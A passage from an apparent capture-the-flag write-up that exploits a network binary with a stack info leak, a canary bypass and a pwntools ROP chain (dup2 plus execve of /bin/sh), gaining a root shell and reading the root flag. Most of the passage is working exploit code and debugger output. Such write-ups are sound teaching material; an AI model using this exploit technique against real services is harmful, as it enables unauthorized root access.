    return p.clean(1)
index = 0
```

You'll notice that instead of sending the numbers as strings like `'1'`, I'll send them like `b'\x01'`. This is because the binary doesn't use `atoi` to convert the numbers to bytes, so we have to send the bytes version of the number instead. I also kept track of the index for debugging purposes, and because I could :\)

Anyways, let's find a good section of the buffer to leak values from. Since we only get one leak per connection, we should find an area with lots of values. For this I'll use `gdb`.

Looking at the buffer with:

```text
pwndbg> x/136a 0x7fffffffdba0
```

I find a good area, with libc, PIE, canary and stack addresses \(PIE and stack aren't needed, I just liked getting the whole lot ;\)\):

```text
0x7fffffffdf20: 0x0     0x7ffff7b268b5 <__GI___inet_aton+165>
0x7fffffffdf30: 0x7fffffffe010  0x7fffffffdfa4
0x7fffffffdf40: 0x7ffff7ffe738  0x555555555039
0x7fffffffdf50: 0x7f00000001    0xaae3cdfe2298ff00
```

I then find how far away that is from the start of the buffer:

```text
pwndbg> p/x 0x7fffffffdf28 - 0x7fffffffdba0
$3 = 0x388 (904)
```

Now we can code up the leak:

```python
write('A'*0xff)        # index = 255
write('A'*0xff)        # index = 510
write('A'*0xff)        # index = 765
write('A'*(0xff - 116))    # index = 904
copy(56, offset=index)    # index = 960

leak = dump().strip(b'A'*904)
```

This just pads up to the area, then copies the area of memory to the same place \(just like before\), so it increments the index and we can then dump it. The below just parses that output so we can use them later:

```python
inet_aton = u64(leak[0:8]) - 165
libc.address = inet_aton - libc.sym["__inet_aton"]
log.info(f"libc base : {hex(libc.address)}")

pie_leak = u64(leak[32:40])
e.address = pie_leak - 0x1039
log.info(f"binary base : {hex(e.address)}")

canary = u64(leak[48:56])
log.info(f"canary : {hex(canary)}")

rbp = u64(leak[16:24]) + 0xc
buffer_start = rbp - 0x410
log.info(f"buffer : {hex(buffer_start)}")
```

We then make a new connection as the current one was terminated by the `dump`:

```python
p.close()    # we create a new connection to exploit, as the previous one is terminated by the dump
p = remote("127.0.0.1", port)
index = 0
```

Now we need to overflow and get a shell. First we'll form the payload that we'll deliver with pwntools `rop` class:

```python
binsh = next(libc.search(b'/bin/sh\x00'))

rop = ROP(libc)
rop.raw(canary)        # canary
rop.raw(rbp)        # base pointer, not needed
rop.dup2(4, 0)        # dup2(sockfd, stdin)
rop.dup2(4, 1)        # dup2(sockfd, stdout)
rop.execve(binsh, 0, 0)    # execve("/bin/sh", NULL, NULL)
```

We first call `dup2` twice to duplicate the socket file descriptor into stdout and stdin, so that once we execute the shell, we can actually interact with it. Then we obviously make our execve call to get our shell.

Now we need to copy this so that it overwrites the return pointer. We'll pad up to `1020`, which is 4 less than our input:

```python
payload = b"A" * 12 + rop.chain()

write(payload.ljust(0xff, b'A'))    # index = 255
write(b'B'*0xff)    # index = 510
write(b'C'*0xff)    # index = 765
write(b'D'*0xff)    # index = 1020
```

The canary is located 1032 bytes after the start of out input, so place `b"A" * 12` before our payload to pad it up to that. We then `copy` from offset 0:

```python
copy(len(payload), offset=0)    # stack smash
```

Which will overwrite the return pointer. Then we trigger the `ret` with `dump`:

```python
dump()    # trigger return
```

And get our shell:

```text
p.interactive()        # get shell
```

Running this against the binary locally works:

```text
$ echo 'working local exploit!'
working local exploit!
```

And since we set up the environment before, transferring it to remote should work just fine:

```text
$ id
uid=0(root) gid=0(root) groups=0(root)
```

And it does! Now we can just get the root flag and successfully pwn this box:

```text
$ cat /root/root.txt
61db36a363ed4081c35b37e2d85e1c36
```

Sweet!

